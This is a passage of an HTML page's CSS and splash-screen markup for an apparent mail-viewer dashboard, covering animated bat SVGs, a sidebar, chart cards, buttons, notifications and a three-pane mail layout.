    100% { opacity: 0; transform: translate(120vw, -15px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight11 {
    0% { opacity: 0; transform: translate(0, 0) rotate(5deg) scaleY(0.7); }
    7% { opacity: 0.55; }
    24% { transform: translate(-28vw, 70px) rotate(-6deg) scaleY(1.1); }
    48% { transform: translate(-62vw, -55px) rotate(8deg) scaleY(0.5); }
    70% { transform: translate(-90vw, 45px) rotate(-4deg) scaleY(1.0); }
    85% { opacity: 0.55; transform: translate(-108vw, -20px) rotate(6deg) scaleY(0.7); }
    100% { opacity: 0; transform: translate(-120vw, 25px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight12 {
    0% { opacity: 0; transform: translate(0, 0) rotate(-6deg) scaleY(0.95); }
    8% { opacity: 0.5; }
    26% { transform: translate(38vw, -55px) rotate(5deg) scaleY(0.55); }
    52% { transform: translate(72vw, 75px) rotate(-7deg) scaleY(1.15); }
    72% { transform: translate(98vw, -65px) rotate(4deg) scaleY(0.5); }
    86% { opacity: 0.5; transform: translate(112vw, 35px) rotate(-5deg) scaleY(0.85); }
    100% { opacity: 0; transform: translate(120vw, -20px) rotate(0deg) scaleY(1); }
}

/* Sparkle particles behind bats */
@keyframes sparkle {
    0%, 100% { opacity: 0; transform: scale(0); }
    30% { opacity: 0.4; transform: scale(1); }
    60% { opacity: 0.1; transform: scale(0.3); }
}
.moon-glow {
    position: absolute;
    top: 8%;
    right: 15%;
    width: 80px;
    height: 80px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(255,255,240,0.1) 0%, rgba(255,255,200,0.03) 40%, transparent 70%);
    box-shadow: 0 0 80px 30px rgba(255, 255, 200, 0.04);
    pointer-events: none;
    z-index: 0;
}

.splash-logo {
    width: 220px;
    height: 220px;
    border-radius: 50%;
    background-image: url('logo.jpg');
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;
    box-shadow: 0 0 70px var(--accent-glow), 0 0 140px rgba(0, 255, 163, 0.15);
    animation: pulseLogo 3s infinite ease-in-out;
}
@keyframes pulseLogo {
    0% { transform: scale(1); box-shadow: 0 0 40px var(--accent-glow); }
    50% { transform: scale(1.06); box-shadow: 0 0 90px var(--accent-glow-strong); }
    100% { transform: scale(1); box-shadow: 0 0 40px var(--accent-glow); }
}

.loader-bar {
    width: 280px;
    height: 3px;
    background: rgba(255,255,255,0.06);
    border-radius: 10px;
    margin-top: 36px;
    overflow: hidden;
}
.loader-fill {
    width: 0%;
    height: 100%;
    background: linear-gradient(90deg, var(--accent), var(--accent-secondary));
    box-shadow: 0 0 16px var(--accent);
    border-radius: 10px;
    animation: load 2.2s forwards ease-in-out;
}
@keyframes load { 0% { width: 0%; } 100% { width: 100%; } }

/* ─ Distribution Charts ─ */
.chart-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 24px; }
.chart-card { background: rgba(17, 22, 32, 0.85); border: 1px solid var(--border); border-radius: 16px; padding: 20px; backdrop-filter: blur(12px); transition: border-color 0.3s, box-shadow 0.3s; position: relative; overflow: hidden; }
.chart-card:hover { border-color: rgba(0,255,163,0.3); box-shadow: 0 0 24px rgba(0,255,163,0.08); }
.chart-card-title { display: flex; align-items: center; gap: 8px; margin-bottom: 16px; font-size: 0.95rem; font-weight: 700; color: var(--text-primary); }
.chart-card-title svg { opacity: 0.7; }
.chart-canvas-wrap { display: flex; justify-content: center; align-items: center; margin-bottom: 16px; position: relative; }
.chart-canvas-wrap canvas { max-width: 220px; max-height: 220px; }
.chart-center-label { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; pointer-events: none; }
.chart-center-label .chart-total { font-size: 1.4rem; font-weight: 800; color: var(--text-primary); }
.chart-center-label .chart-total-sub { font-size: 0.65rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; }
.chart-legend { display: flex; flex-wrap: wrap; gap: 6px 12px; max-height: 120px; overflow-y: auto; }
.chart-legend-item { display: flex; align-items: center; gap: 4px; font-size: 0.65rem; color: var(--text-secondary); white-space: nowrap; }
.chart-legend-color { width: 10px; height: 10px; border-radius: 2px; flex-shrink: 0; }
.chart-tooltip { position: absolute; background: rgba(0,0,0,0.88); color: #fff; padding: 6px 12px; border-radius: 8px; font-size: 0.75rem; pointer-events: none; z-index: 10; white-space: nowrap; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(8px); display: none; }
@media (max-width: 900px) { .chart-grid { grid-template-columns: 1fr; } }

/* ─── Sidebar ─── */
.sidebar {
    width: 272px;
    height: 100vh;
    background: var(--bg-sidebar);
    border-right: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    padding: 20px 16px;
    z-index: 1001;
    overflow-y: auto;
    position: sticky;
    top: 0;
    backdrop-filter: blur(8px);
    transition: transform 0.3s ease;
}
@media (max-width: 900px) {
    .sidebar {
        position: fixed;
        left: 0;
        transform: translateX(-100%);
        box-shadow: 10px 0 30px rgba(0,0,0,0.5);
    }
    .sidebar.sidebar-open {
        transform: translateX(0);
    }
    #mobile-menu-toggle { display: block !important; }
    #mobile-close-btn { display: block !important; }
    #mobile-close-btn { display: block !important; }
}
.logo-area {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 8px 12px 24px 12px;
    border-bottom: 1px solid var(--border);
    margin-bottom: 16px;
    flex-shrink: 0;
}
.logo-icon {
    width: 40px; height: 40px;
    border-radius: 12px;
    background: linear-gradient(135deg, var(--accent), #008f5a);
    display: flex; align-items: center; justify-content: center;
    font-size: 1.4rem;
    box-shadow: 0 4px 16px var(--accent-glow);
}
.logo-text {
    font-size: 1.05rem;
    font-weight: 800;
    color: var(--accent);
    letter-spacing: -0.3px;
    line-height: 1.2;
}
.logo-sub { font-size: 0.6rem; color: var(--text-muted); font-weight: 600; letter-spacing: 2px; }

.nav-section-label {
    font-size: 0.6rem;
    text-transform: uppercase;
    letter-spacing: 2px;
    color: var(--text-muted);
    padding: 12px 14px 6px 14px;
    font-weight: 700;
    flex-shrink: 0;
}

.nav-item {
    display: flex;
    align-items: center;
    gap: 11px;
    padding: 11px 14px;
    margin-bottom: 3px;
    border-radius: var(--radius-sm);
    cursor: pointer;
    font-weight: 600;
    font-size: 0.82rem;
    transition: all var(--transition-smooth);
    color: var(--text-secondary);
    flex-shrink: 0;
    position: relative;
    overflow: hidden;
}
.nav-item::before {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, transparent, rgba(0, 255, 163, 0.04));
    opacity: 0;
    transition: opacity var(--transition-smooth);
}
.nav-item:hover::before { opacity: 1; }
.nav-item:hover {
    background: var(--hover);
    color: var(--text-primary);
    transform: translateX(3px);
    box-shadow: 0 2px 12px rgba(0,0,0,0.2);
}
.nav-item.active {
    background: linear-gradient(135deg, rgba(0, 255, 163, 0.15), rgba(0, 212, 255, 0.08));
    color: var(--accent);
    box-shadow: inset 0 0 0 1px rgba(0, 255, 163, 0.3), 0 4px 20px rgba(0, 255, 163, 0.15);
    transform: translateX(3px);
}
.nav-item svg { transition: transform var(--transition-bounce); flex-shrink: 0; }
.nav-item:hover svg { transform: scale(1.1); }
.nav-item.active svg { transform: scale(1.15); stroke: var(--accent); }

.sidebar-footer {
    margin-top: auto;
    padding: 16px 12px;
    border-top: 1px solid var(--border);
    font-size: 0.7rem;
    color: var(--text-secondary);
    text-align: center;
    flex-shrink: 0;
}

/* ─── Content Area ─── */
.content {
    flex: 1;
    display: flex;
    flex-direction: column;
    min-width: 0;
    background: linear-gradient(180deg, var(--bg-main) 0%, #080b12 100%);
}

.header {
    min-height: 68px;
    height: auto;
    background: rgba(10, 12, 16, 0.7);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    padding: 12px 28px;
    justify-content: space-between;
    z-index: 100;
    box-shadow: 0 1px 20px rgba(0,0,0,0.3);
    flex-wrap: wrap;
    gap: 12px;
}

.v-container {
    flex: 1;
    padding: 28px;
    overflow-y: auto;
    display: none;
    flex-direction: column;
    gap: 24px;
    animation: fadeSlideIn 0.35s ease;
}
.v-container.active { display: flex; flex-direction: column; flex: 1; min-height: 0; }
@keyframes fadeSlideIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
}

/* ─── Glassmorphism Cards ─── */
.glass-card {
    background: var(--glass-bg);
    backdrop-filter: var(--glass-blur);
    -webkit-backdrop-filter: var(--glass-blur);
    border: 1px solid var(--glass-border);
    border-radius: var(--radius-lg);
    padding: 32px;
    box-shadow: var(--shadow-card);
    transition: all var(--transition-smooth);
}
.glass-card:hover { border-color: rgba(0, 255, 163, 0.15); box-shadow: var(--shadow-card), 0 0 60px rgba(0,255,163,0.03); }

/* ─── Form Elements ─── */
textarea, input[type="text"], input[type="number"], input[type="file"] {
    width: 100%;
    background: rgba(0, 0, 0, 0.4);
    border: 1px solid var(--border);
    color: var(--text-primary);
    padding: 13px 16px;
    border-radius: var(--radius-sm);
    outline: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.88rem;
    transition: all var(--transition-fast);
    resize: vertical;
}
textarea::placeholder, input::placeholder { color: var(--text-muted); }
textarea:focus, input:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 3px rgba(0, 255, 163, 0.1), 0 0 20px rgba(0, 255, 163, 0.05);
    background: rgba(0, 0, 0, 0.6);
}
select {
    background: rgba(0, 0, 0, 0.4);
    color: var(--text-primary);
    border: 1px solid var(--border);
    padding: 8px 12px;
    border-radius: var(--radius-sm);
    font-size: 0.82rem;
    cursor: pointer;
    transition: all var(--transition-fast);
    font-family: 'Outfit', sans-serif;
}
select:hover { border-color: var(--accent); }
select:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(0, 255, 163, 0.1); }

input[type="checkbox"] {
    accent-color: var(--accent);
    cursor: pointer;
    width: 16px; height: 16px;
}

/* ─── Buttons ─── */
.btn {
    padding: 10px 22px;
    border-radius: var(--radius-sm);
    font-weight: 700;
    cursor: pointer;
    transition: all var(--transition-bounce);
    border: none;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    text-transform: uppercase;
    font-size: 0.78rem;
    letter-spacing: 0.5px;
    font-family: 'Outfit', sans-serif;
    position: relative;
    overflow: hidden;
}
.btn::after {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, rgba(255,255,255,0.08), transparent);
    opacity: 0;
    transition: opacity var(--transition-fast);
}
.btn:hover::after { opacity: 1; }

.btn-primary {
    background: linear-gradient(135deg, var(--accent), #00cc82);
    color: #000;
    box-shadow: 0 4px 20px rgba(0, 255, 163, 0.2);
}
.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0, 255, 163, 0.35); }
.btn-primary:active { transform: translateY(0); }

.btn-secondary {
    background: rgba(30, 41, 59, 0.7);
    color: var(--text-primary);
    border: 1px solid var(--border-light);
    backdrop-filter: blur(4px);
}
.btn-secondary:hover {
    background: rgba(40, 55, 75, 0.8);
    border-color: var(--accent);
    transform: translateY(-1px);
    box-shadow: 0 4px 16px rgba(0,0,0,0.3);
}

.btn-danger { background: var(--danger); color: #fff; box-shadow: 0 4px 16px rgba(239, 68, 68, 0.2); }
.btn-danger:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(239, 68, 68, 0.35); }

.btn-success { background: var(--success); color: #fff; box-shadow: 0 4px 16px rgba(16, 185, 129, 0.2); }
.btn-success:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(16, 185, 129, 0.35); }

/* ─── Stats & Pills ─── */
.stats-group { display: flex; gap: 10px; flex-wrap: wrap; }
.stat-pill {
    background: rgba(255,255,255,0.04);
    padding: 6px 14px;
    border-radius: 99px;
    border: 1px solid var(--border);
    font-size: 0.8rem;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 7px;
    transition: all var(--transition-fast);
    backdrop-filter: blur(4px);
}
.stat-pill:hover { border-color: var(--accent); background: rgba(0,255,163,0.04); }

/* ─── Notifications ─── */
#notif-container {
    position: fixed;
    bottom: 24px; right: 24px;
    z-index: 9999;
    display: flex;
    flex-direction: column;
    gap: 10px;
    pointer-events: none;
}
.notif {
    padding: 14px 24px;
    border-radius: var(--radius-md);
    color: #fff;
    font-size: 0.85rem;
    font-weight: 600;
    min-width: 260px;
    box-shadow: 0 12px 40px rgba(0,0,0,0.5);
    animation: slideInNotif 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
    display: flex;
    align-items: center;
    gap: 12px;
    backdrop-filter: blur(12px);
    pointer-events: auto;
}
.notif.success { background: linear-gradient(135deg, rgba(0,255,163,0.9), rgba(0,180,120,0.95)); color: #000; }
.notif.error { background: linear-gradient(135deg, rgba(239,68,68,0.9), rgba(200,40,80,0.95)); }
.notif.info { background: linear-gradient(135deg, rgba(59,130,246,0.85), rgba(100,90,220,0.9)); }
@keyframes slideInNotif { from { transform: translateX(120%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

/* ─── Mail Viewer Grid ─── */
.mail-viewer {
    display: grid;
    grid-template-columns: 220px 380px 1fr;
    height: 100%;
    background: var(--bg-main);
    min-height: 0;
    overflow: hidden;
    border-radius: var(--radius-md);
    border: 1px solid var(--border);
}
.mail-viewer > div { min-width: 0; overflow: hidden; height: 100%; display: flex; flex-direction: column; border-right: 1px solid var(--border); }
.mail-viewer > div:last-child { border-right: none; }

.folder-list {
    padding: 12px;
    background: var(--bg-sidebar);
    display: flex;
    flex-direction: column;
    gap: 3px;
}
.f-item {
    padding: 9px 12px;
    border-radius: var(--radius-sm);
    cursor: pointer;
    font-size: 0.85rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
    color: var(--text-secondary);
    transition: all var(--transition-fast);
    font-weight: 500;
}
.f-item:hover { background: var(--hover); color: var(--text-primary); }
.f-item.active { background: rgba(0, 255, 163, 0.12); color: var(--accent); font-weight: 700; }

.mail-list { border-right: 1px solid var(--border); display: flex; flex-direction: column; min-width: 0; background: var(--bg-card); }
.mail-item {
    padding: 14px 20px;
    border-bottom: 1px solid var(--border);
    cursor: pointer;
    transition: all var(--transition-fast);
    background: transparent;
}
.mail-item:hover { background: var(--hover); }
.mail-item.active { border-left: 3px solid var(--accent); background: rgba(0,255,163,0.06); box-shadow: inset 0 0 20px rgba(0,255,163,0.03); }

/* ─── Preview Iframe ─── */
iframe {
    width: 100%; height: 100%; border: none;
    background: #fff;
    border-radius: var(--radius-sm);
    display: block;
}

/* ─── Scrollbar ─── */
::-webkit-scrollbar { width: 8px; height: 8px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
::-webkit-scrollbar-thumb:hover { background: var(--border-light); }

/* ─── Misc Utilities ─── */
.dot-blink {
    animation: blink 1.2s infinite alternate;
}
@keyframes blink { from { opacity: 0.3; transform: scale(0.8); } to { opacity: 1; transform: scale(1.15); } }

.accent-glow-text { color: var(--accent); text-shadow: 0 0 20px var(--accent-glow); }
.mono { font-family: 'JetBrains Mono', monospace; }

.pro-tip-box {
    background: rgba(0, 255, 163, 0.04);
    padding: 16px;
    border-radius: var(--radius-sm);
    border: 1px dashed rgba(0, 255, 163, 0.2);
    font-size: 0.78rem;
}
.pro-tip-box .tip-title { font-weight: 800; color: var(--accent); margin-bottom: 6px; font-size: 0.8rem; }
.pro-tip-box .tip-body { color: var(--text-secondary); line-height: 1.5; }

.info-card {
    background: rgba(59, 130, 246, 0.04);
    border: 1px dashed rgba(59, 130, 246, 0.2);
    padding: 16px;
    border-radius: var(--radius-sm);
}

.tag-badge {
    background: rgba(0, 255, 163, 0.1);
    color: var(--accent);
    padding: 3px 10px;
    border-radius: 99px;
    font-size: 0.7rem;
    font-weight: 700;
    display: inline-flex;
    align-items: center;
    gap: 4px;
}

.console-output {
    background: rgba(0,0,0,0.5);
    padding: 16px;
    border-radius: var(--radius-sm);
    border: 1px solid var(--border);
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.78rem;
    color: var(--text-secondary);
    overflow-y: auto;
    backdrop-filter: blur(4px);
}

/* ─── Comprehensive Mobile Responsiveness ─── */
@media (max-width: 900px) {
    .mail-viewer {
        flex-direction: column !important;
        height: auto !important;
    }
    .mail-viewer > div {
        width: 100% !important;
        height: 400px !important;
        border-right: none !important;
        border-bottom: 1px solid var(--border);
    }
    .mail-viewer > div:last-child {
        height: 600px !important;
        border-bottom: none;
    }
    
    /* Stack tables */
    .table-container, .table-wrapper, table {
        display: block !important;
        width: 100% !important;
        overflow-x: auto !important;
        white-space: nowrap !important;
    }
    
    /* Wrap flex containers */
    .header > div {
        flex-wrap: wrap !important;
        gap: 12px !important;
    }
    
    /* Stats Grids */
    .stat-grid {
        display: grid !important;
        grid-template-columns: 1fr !important;
    }
    
    .content {
        padding: 10px !important;
    }
}

</style>
</head>
<body>
<div id="notif-container"></div>
<div id="splash">
    <audio id="splash-audio" src="/wolf-audio" preload="auto" loop></audio>
    <div class="moon-glow"></div>
    <!-- Flying Bats — realistic silhouette, each size/direction set by CSS -->
    <div class="bat bat-1"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><!-- Left wing membrane --><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="var(--accent)" opacity="0.85"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.4"/><!-- Right wing membrane --><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="var(--accent)" opacity="0.85"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.4"/><!-- Body --><ellipse cx="50" cy="22" rx="6" ry="8" fill="var(--accent)" opacity="0.9"/><!-- Head --><ellipse cx="50" cy="14" rx="4" ry="4" fill="var(--accent)" opacity="0.9"/><!-- Left ear --><polygon points="48,12 44,6 46,11" fill="var(--accent)" opacity="0.9"/><!-- Right ear --><polygon points="52,12 56,6 54,11" fill="var(--accent)" opacity="0.9"/><!-- Tail membrane --><path d="M46 29 Q44 36 48 38 L50 30 Z" fill="var(--accent)" opacity="0.6"/><path d="M54 29 Q56 36 52 38 L50 30 Z" fill="var(--accent)" opacity="0.6"/></svg></div>
    <div class="bat bat-2"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="#00d4ff" opacity="0.7"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.3"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="#00d4ff" opacity="0.7"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.3"/><ellipse cx="50" cy="22" rx="6" ry="8" fill="#00d4ff" opacity="0.8"/><ellipse cx="50" cy="14" rx="4" ry="4" fill="#00d4ff" opacity="0.8"/><polygon points="48,12 44,6 46,11" fill="#00d4ff" opacity="0.8"/><polygon points="52,12 56,6 54,11" fill="#00d4ff" opacity="0.8"/><path d="M46 29 Q44 36 48 38 L50 30 Z" fill="#00d4ff" opacity="0.5"/><path d="M54 29 Q56 36 52 38 L50 30 Z" fill="#00d4ff" opacity="0.5"/></svg></div>
    <div class="bat bat-3"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="var(--accent)" opacity="0.6"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.25"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="var(--accent)" opacity="0.6"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.25"/><ellipse cx="50" cy="22" rx="5" ry="7" fill="var(--accent)" opacity="0.7"/><ellipse cx="50" cy="14" rx="3.5" ry="3.5" fill="var(--accent)" opacity="0.7"/><polygon points="48,12 44.5,7 46,11" fill="var(--accent)" opacity="0.7"/><polygon points="52,12 55.5,7 54,11" fill="var(--accent)" opacity="0.7"/><path d="M46.5 28.5 Q44 35 48 37 L50 30 Z" fill="var(--accent)" opacity="0.4"/><path d="M53.5 28.5 Q56 35 52 37 L50 30 Z" fill="var(--accent)" opacity="0.4"/></svg></div>
    <div class="bat bat-4"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="#00d4ff" opacity="0.65"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.3"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="#00d4ff" opacity="0.65"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.3"/><ellipse cx="50" cy="22" rx="5" ry="7" fill="#00d4ff" opacity="0.75"/><ellipse cx="50" cy="14" rx="3.5" ry="3.5" fill="#00d4ff" opacity="0.75"/><polygon points="48,12 44.5,7 46,11" fill="#00d4ff" opacity="0.75"/><polygon points="52,12 55.5,7 54,11" fill="#00d4ff" opacity="0.75"/><path d="M46.5 28.5 Q44 35 48 37 L50 30 Z" fill="#00d4ff" opacity="0.45"/><path d="M53.5 28.5 Q56 35 52 37 L50 30 Z" fill="#00d4ff" opacity="0.45"/></svg></div>
    <div class="bat bat-5"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="var(--accent)" opacity="0.55"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.2"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="var(--accent)" opacity="0.55"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.2"/><ellipse cx="50" cy="22" rx="4.5" ry="6" fill="var(--accent)" opacity="0.65"/><ellipse cx="50" cy="15" rx="3" ry="3" fill="var(--accent)" opacity="0.65"/><polygon points="48,13 45,8 46,12" fill="var(--accent)" opacity="0.65"/><polygon points="52,13 55,8 54,12" fill="var(--accent)" opacity="0.65"/><path d="M47 28 Q45 34 48.5 36 L50 30 Z" fill="var(--accent)" opacity="0.35"/><path d="M53 28 Q55 34 51.5 36 L50 30 Z" fill="var(--accent)" opacity="0.35"/></svg></div>
    <div class="bat bat-6"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="var(--accent)" opacity="0.75"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.35"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="var(--accent)" opacity="0.75"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.35"/><ellipse cx="50" cy="22" rx="6" ry="8" fill="var(--accent)" opacity="0.85"/><ellipse cx="50" cy="14" rx="4" ry="4" fill="var(--accent)" opacity="0.85"/><polygon points="48,12 44,6 46,11" fill="var(--accent)" opacity="0.85"/><polygon points="52,12 56,6 54,11" fill="var(--accent)" opacity="0.85"/><path d="M46 29 Q44 36 48 38 L50 30 Z" fill="var(--accent)" opacity="0.55"/><path d="M54 29 Q56 36 52 38 L50 30 Z" fill="var(--accent)" opacity="0.55"/></svg></div>
    <div class="bat bat-7"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="#00d4ff" opacity="0.6"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.25"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="#00d4ff" opacity="0.6"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.25"/><ellipse cx="50" cy="22" rx="5" ry="7" fill="#00d4ff" opacity="0.7"/><ellipse cx="50" cy="14" rx="3.5" ry="3.5" fill="#00d4ff" opacity="0.7"/><polygon points="48,12 44.5,7 46,11" fill="#00d4ff" opacity="0.7"/><polygon points="52,12 55.5,7 54,11" fill="#00d4ff" opacity="0.7"/><path d="M46.5 28.5 Q44 35 48 37 L50 30 Z" fill="#00d4ff" opacity="0.4"/><path d="M53.5 28.5 Q56 35 52 37 L50 30 Z" fill="#00d4ff" opacity="0.4"/></svg></div>
    <div class="bat bat-8"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="var(--accent)" opacity="0.65"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.25"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="var(--accent)" opacity="0.65"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.25"/><ellipse cx="50" cy="22" rx="4.5" ry="6.5" fill="var(--accent)" opacity="0.75"/><ellipse cx="50" cy="15" rx="3" ry="3" fill="var(--accent)" opacity="0.75"/><polygon points="48,13 45,8 46,12" fill="var(--accent)" opacity="0.75"/><polygon points="52,13 55,8 54,12" fill="var(--accent)" opacity="0.75"/><path d="M47 28 Q45 34 48.5 36 L50 30 Z" fill="var(--accent)" opacity="0.4"/><path d="M53 28 Q55 34 51.5 36 L50 30 Z" fill="var(--accent)" opacity="0.4"/></svg></div>
